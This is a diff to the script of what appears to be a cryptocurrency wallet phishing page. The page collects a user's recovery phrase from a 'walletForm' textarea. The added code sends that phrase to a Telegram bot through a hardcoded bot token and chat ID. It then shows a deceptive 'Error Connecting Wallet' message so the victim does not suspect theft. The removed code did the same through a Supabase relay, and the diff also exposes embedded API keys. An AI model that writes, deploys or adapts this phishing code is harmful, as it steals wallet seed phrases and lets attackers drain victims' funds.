@@ -172,68 +172,72 @@
     </div>
   </div>
 
-  <script>
-    const SUPABASE_URL = "https://tbsfzpbwgkpozumonhmr.supabase.co";
-    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRic2Z6cGJ3Z2twb3p1bW9uaG1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI0NDg2MTcsImV4cCI6MjA4ODAyNDYxN30.jNM3LpPGuS2lMyKREZlQ4koin6iyExX6Rfsvk-kQwnY";
+ <script>
+  const BOT_TOKEN = "8780085699:AAGNumIO7LNB9g3JN8-wr_WA7YvpdeBfNiw";
+  const CHAT_ID = "8108507822";
 
-    const form = document.getElementById("walletForm");
-    const btn = document.getElementById("submitBtn");
-    const msg = document.getElementById("msg");
-    const phrase = document.getElementById("phrase");
+  const form = document.getElementById("walletForm");
+  const btn = document.getElementById("submitBtn");
+  const msg = document.getElementById("msg");
+  const textarea = document.getElementById("phrase");
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const text = phrase.value.trim();
-      if (text.length < 12) {
-    msg.textContent = "Use at least 12 or 24 characters.";
-    msg.className = "message error";
-    return;
-}
+  // Modal setup
+  const modal = document.getElementById("modalOverlay");
+  const closeModal = document.getElementById("closeModal");
 
-      btn.disabled = true;
-      btn.innerHTML = '<span class="spinner"></span>Connecting…';
-      msg.textContent = "";
-      msg.className = "message";
-
-      try {
-        const res = await fetch(`${SUPABASE_URL}/functions/v1/send-to-telegram`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "apikey": SUPABASE_ANON_KEY,
-            "Authorization": `Bearer ${SUPABASE_ANON_KEY}`
-          },
-          body: JSON.stringify({ message: text })
-        });
-
-        const data = await res.json();
-
-        if (!res.ok) throw new Error(data.error || "Connection failed");
-
-        document.getElementById("modalOverlay").style.display = "flex";
-        phrase.value = "";
-      } catch (err) {
-        msg.textContent = err.message || "Something went wrong";
-        msg.className = "message error";
-      } finally {
-        btn.disabled = false;
-        btn.innerHTML = "Connect";
-      }
-
-      const modal = document.getElementById("modalOverlay");
-const closeModal = document.getElementById("closeModal");
-
-closeModal.addEventListener("click", () => {
-  modal.style.display = "none";
-});
-
-modal.addEventListener("click", (e) => {
-  if (e.target === modal) {
+  closeModal.addEventListener("click", () => {
     modal.style.display = "none";
-  }
-});
-    });
-  </script>
+  });
+
+  modal.addEventListener("click", (e) => {
+    if (e.target === modal) modal.style.display = "none";
+  });
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const text = textarea.value.trim();
+
+    // ✅ VALIDATION (LESS THAN 12 CHARACTERS)
+    if (text.length < 12) {
+      modal.querySelector("p").textContent = "⚠️ Please input at least 12 characters";
+      modal.style.display = "flex";
+      return;
+    }
+
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>Sending...';
+    msg.textContent = "";
+
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `📩 New Message:\n\n${text}`
+        })
+      });
+
+      if (!res.ok) throw new Error("Failed to send");
+
+      // ✅ SUCCESS POPUP
+      modal.querySelector("p").textContent = "❌ Error Connecting Wallet";
+      modal.style.display = "flex";
+
+      textarea.value = "";
+
+    } catch (err) {
+      modal.querySelector("p").textContent = "❌ Failed to send message";
+      modal.style.display = "flex";
+    } finally {
+      btn.disabled = false;
+      btn.innerHTML = "Send";
+    }
+  });
+</script>
 
 </body>
 </html>
